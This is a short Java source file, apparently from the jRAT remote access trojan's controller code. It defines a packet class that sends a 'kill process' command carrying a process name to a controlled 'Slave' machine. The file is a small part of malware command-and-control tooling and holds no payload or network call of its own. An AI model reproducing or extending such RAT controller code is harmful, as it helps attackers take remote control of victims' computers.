package jrat.module.process;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class PacketKillProcess implements OutgoingPacket {

	private String process;

	public PacketKillProcess(String process) {
		this.process = process;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(process);
	}

	@Override
	public short getPacketId() {
		return 20;
	}

}
